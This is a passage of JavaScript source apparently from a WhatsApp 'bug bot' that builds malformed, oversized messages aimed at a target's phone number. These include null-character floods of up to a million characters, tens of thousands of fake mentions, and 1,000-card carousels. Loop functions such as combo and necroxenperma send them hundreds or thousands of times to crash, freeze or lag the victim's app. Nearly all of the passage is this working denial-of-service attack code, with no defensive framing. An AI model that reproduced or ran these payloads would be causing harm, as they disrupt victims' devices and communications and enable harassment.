                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Arya Valensya",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "🩸𐎟𑆻𝐖͢𝐈͠𝐍͜𝐆͢𝐒͠ 𝐒͜𝐔͠𝐏͢𝐄͜𝐑͠𝐍͢𝐀͜𝐘͠𝐑⍣𐎟𑆻⃔",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://youtube.com/@limmvz",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "🩸𐎟𑆻𝐌𝐄𝐆𝐔𝐌𝐈 𝐃𝐈𝐀𝐍𝐀 𝐁𝐀𝐇𝐀𝐇𝐀⍣𐎟𑆻⃔",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Arya Official\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "🩸𐎟𑆻𝐌𝐄𝐆𝐔𝐌𝐈 𝐃𝐈𝐀𝐍𝐀 𝐁𝐀𝐇𝐀𝐇𝐀⍣𐎟𑆻⃔",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "🩸𐎟𑆻𝐌𝐄𝐆𝐔𝐌𝐈 𝐃𝐈𝐀𝐍𝐀 𝐁𝐀𝐇𝐀𝐇𝐀⍣𐎟𑆻⃔",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await surz.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

// End func
async function kuota(target) {
    for (let i = 0; i < 300; i++) {
    await protocol6(target);
    await bulldozer(target);
    await protocolbug5(target);
    }
}
async function blank(target) {
    for (let i = 0; i <= 150; i++) {
    await invico1(target)
    await UiScorpio(target)
    }
}
async function fc(target) {
    for (let r = 0; r < 50; r++) {
    await Forklift(target);
    }
}
async function proto6(target) {
    for (let r = 0; r < 200; r++) {
    await protocolbug3(target);
    await protocol6(target);
    await protocolbug4(target)
    }
}
async function invis(target) {
    for (let i = 0; i < 200; i++) {
    await Nativeprotocol(target);
    }
}
async function delay3(target) {
    for (let r = 0; r < 200; r++) {
    await NotifFreeze(target);
    await protocol6(target);
    await protocolbug3(target);
    await celloinv(target, mention = true)
    await InVisibleX1(target, true);
    await protocol6(target);
    await invisiblenew(target);
    await protocolbug3(target);
    await celloinv(target, mention = true)
    await InVisibleX1(target, true);
    }
}
async function anjaz(target) {
    for (let i = 0; i < 500; i++) {
    await Wraperos2(target);
    await Surz7(target, true);
    await NotifFreeze(target);
    }
}
async function combo(target) {
    for (let r = 0; r < 200; r++) {
    await Wraperos2(target);
    await Surz7(target);
    await NotifFreeze(target);
    await protocol6(target, mention = true)
    await protocolbug3(target, true);
    await invisiblenew(target);
    await protocolbug3(target);
    await InVisibleX1(target, true);
    await Nativeprotocol(target);    
    await protocolbug4(target)
    await Forklift(target);    
    await invico1(target)
    await UiScorpio(target)    
    await bulldozer(target);
    await protocolbug5(target);           
    }
}




async function AtrasoFvck() {
  
    if (wtfBro) return;
    wtfBro = true;

    const wtfXrL = Array.from({ length: memek_ibulu }).map(() =>
        (async () => {
            while (true) {
                const job = CallQueue.shift();
                if (!job) {
                    await wait(2);
                    continue;
                }

                try {
                    const start = Date.now();
                    await flowresInvisibleV4(job.number);
                    const duration = Date.now() - start;

                    if (duration > 200) adaptiveKontl += 5;
                    else if (adaptiveKontl > delay_kont) adaptiveKontl -= 1;

                } catch { }

                await wait(adaptiveKontl);
            }
        })()
    );

    await Promise.all(wtfXrL);
}

//=================================================//







async function carouselDelay(sock, target) {
  let haxxn = 2;

  for (let x = 0; x < haxxn; x++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 5; i++) {
      buttt.push({
        name: "galaxy_message",
        buttonParamsJson: JSON.stringify({
          header: "null",
          body: "xxx",
          flow_action: "navigate",
          flow_action_payload: { screen: "FORM_SCREEN" },
          flow_cta: "Grattler",
          flow_id: "1169834181134583",
          flow_message_version: "3",
          flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 1000; i++) {
      push.push({
        body: { text: `\u0000\u0000\u0000\u0000\u0000` },
        footer: { text: "" },
        header: {
          title: "Masbug\u0000\u0000\u0000\u0000",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "591",
            height: 0,
            width: 0,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            scanLengths: [247, 201, 73, 63],
            midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        nativeFlowMessage: { buttons: [] }
      });
    }

    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: "\u0000\u0000\u0000\u0000" },
              footer: { text: "Morphins" },
              header: { hasMediaAttachment: false },
              carouselMessage: { cards: [...push] }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}



async function InVisibleX(target) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒",
                    footerText: "> -FatrCR",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await asep.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await asep.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "༑⌁⃰𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞 *༑⌁",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }

async function DelaySsuper(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "> -FatrCR",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function DelayNewBug(target) {
        	try {
        		let messageObject = await generateWAMessageFromContent(target, {
        			viewOnceMessage: {
        				message: {
        					extendedTextMessage: {
        						text: "NECROXEN",
        						contextInfo: {
        							mentionedJid: Array.from({
        								length: 30000
        							}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
        							isSampled: true,
        							participant: target,
        							remoteJid: "status@broadcast",
        							forwardingScore: 9741,
        							isForwarded: true
        						}
        					}
        				}
        			}
        		}, {});
        		await asep.relayMessage("status@broadcast", messageObject.message, {
        			messageId: messageObject.key.id,
        			statusJidList: [target],
        			additionalNodes: [{
        				tag: "meta",
        				attrs: {},
        				content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target },
        						content: undefined,
        					}],
        				}],
        			}],
        		});
        	} catch (err) {
        	}

        }

async function DelayInVis(target) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "#hay" }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "#hay" }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "#hay",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await asep.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await asep.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "𝐑𝐢𝐥𝐲𝐳𝐲 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "𖤐 𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒𖤐",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await asep.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Vampire Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


async function ExTraKouta(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await asep.relayMessage("status@broadcast", msg.message, {
    messageId: generateMessageID(),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}


async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await asep.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await asep.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "AryaRyuigichi is back ▾" },
                             content: undefined
}
]
}
);
}
}


async function VampireSpamNotif(target, Ptcp = true) {
  await asep.relayMessage(target, {
      groupMentionedMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      documentMessage: {
                          url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                          mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                          fileLength: "9999999999999999",
                          pageCount: 0x9184e729fff,
                          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                          fileName: "𖤐 𝗗𝗼𝗺𝗮𝗶𝗻 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝗼𝗻 𖤐",
                          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                          directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                          mediaKeyTimestamp: "1715880173",
                          contactVcard: true
                      },
                      title: "𖤐 𝗗𝗼𝗺𝗮𝗶𝗻 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝗼𝗻 𖤐" ,
                      hasMediaAttachment: true
                  },
                  body: {
                      text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
                  },
                  nativeFlowMessage: {},
                  contextInfo: {
                      mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                      groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                  }
              }
          }
      }
  }, { participant: { jid: target } }, { messageId: null });
}

async function necroxeneasy(target) {
  for (let i = 0; i < 10000; i++) {
await protocolbug3(target)
await protocolbug3(target)
await protocolbug3(target)
await protocolbug4(target)
await protocolbug4(target)
await protocolbug4(target)
await protocolbug5(target)
await protocolbug5(target)
await sleep(100000)
}
}

async function necroxenbull(target) {
  for (let i = 0; i < 50000; i++) {
await bulldozer(target)
await bulldozer(target)
await bulldozer(target)
}
}

async function necroxenperma(target) {
  for (let i = 0; i < 10000; i++) {
await TrashProtocol(target)
await TrashProtocol(target)
await TrashProtocol(target)
await protocolbug4(target)
await protocolbug4(target)
await protocolbug4(target)
await protocolbug5(target)
await protocolbug5(target)
await protocolbug5(target)
await VampBroadcast(target, mention = true)
await VampBroadcast(target, mention = true)
await VampBroadcast(target, mention = true)
await sleep(100000)
}
}

async function necroxenui(target) {
  for (let i = 0; i < 1000; i++) {
await VampireSpamNotif(target, true);
    await VampireSpamNotif(target, true);
    await VampireSpamNotif(target, true);
    await sleep(100000);

    await VampBroadcast(target, true);
    await VampBroadcast(target, true);
    await VampBroadcast(target, true);
    await sleep(100000);

    await TrashProtocol(target);
    await TrashProtocol(target);
    await TrashProtocol(target);
    await sleep(100000);

    await protocolbug5(target);
    await protocolbug5(target);
    await protocolbug5(target);
    await sleep(100000);
}
}



async function delayByGizz(target) {
  return new Promise(async (resolve) => {
    try {
      const content = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: {
                text: '\u0000'
              },
              footer: {
                text: '\u0000'
              },
              header: {
                hasMediaAttachment: false
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: '\u0000',
                    buttonParamsJson: `https://wa.me/999999999?text=${"\u0000".repeat(1000000)}`,
                  }
                ]
              }
            }
          }
        }
      }, {});

      await sock.relayMessage(target, content.message, {
        messageId: content.key.id,
        participant: { jid: target }
      });

      setTimeout(() => resolve(), 2000);
    } catch (err) {
      console.error('failed:', err);
      resolve();
    }
  });
}




async function QueenSqL(target) {
  const randomHex = (len = 16) =>
    [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");

  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  let msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageAssociation: {
          associationType: 2,
          parentMessageKey: randomHex(16)
        },
        messageSecret: randomHex(32), 
        supportPayload: JSON.stringify({
          version: 2,
          is_ai_message: true,
          should_show_system_message: true,
          expiration: -9999,
          ephemeralSettingTimestamp: 9741,
          disappearingMode: {
            initiator: "INITIATED_BY_OTHER",
            trigger: "ACCOUNT_SETTING"
          }
        }),
        isForwarded: true,
        forwardingScore: 1972,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        quotedMessage: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              jpegThumbnail: fs.readFileSync('./Zu.jpg'),
              title: "Bipzz" + "᭄".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "review_and_pay".repeat(5000),
                  buttonParamsJson: JSON.stringify({
                    currency: "XXX",
                    payment_configuration: "",
                    payment_type: "",
                    total_amount: { value: 1000000, offset: 100 },
                    reference_id: "4SWMDTS1PY4",
                    type: "physical-goods",
                    order: {
                      status: "payment_requested",
                      description: "",
                      subtotal: { value: 0, offset: 100 },
                      order_type: "PAYMENT_REQUEST",
                      items: [
                        {
                          retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                          name: "Bipzz Anti Gedor".repeat(5000),
                          amount: { value: 1000000, offset: 100 },
                          quantity: 1
                        }
                      ]
                    },
                    additional_note: "Bipzz",
                    native_payment_methods: [],
                    share_payment_status: true
                  })
                }
              ],
              messageParamsJson: "{}"
            }
          }
        }
      },
      header: {
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0
        }
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: { value: 1000000, offset: 100 },
              reference_id: "Bipzz",
              type: "physical-goods",
              order: {
                status: "canceled",
                subtotal: { value: 0, offset: 100 },
                order_type: "PAYMENT_REQUEST",
                items: [
                  {
                    retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                    name: "wilzu is herr".repeat(5000),
                    amount: { value: 1000000, offset: 100 },
                    quantity: 1000
                  }
                ]
              },
              additional_note: "Bipzz",
              native_payment_methods: [],
              share_payment_status: true
            })
          }
        ],
        messageParamsJson: "{}"
      },
      annotations: [
        {
          embeddedContent: {
            embeddedMessage: {
              message: "Bipzz Anti Gedor"
            }
          },
          location: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "Bipzz Anti Gedor".repeat(5000)
          },
          polygonVertices: [
            { x: 60.71664810180664, y: -36.39784622192383 },
            { x: -16.710189819335938, y: 49.263675689697266 },
            { x: -56.585853576660156, y: 37.85963439941406 },
            { x: 20.840980529785156, y: -47.80188751220703 }
          ],
          newsletter: {
            newsletterJid: "1@newsletter",
            newsletterName: "Bipzz Anti Gedor".repeat(5000),
            contentType: "UPDATE",
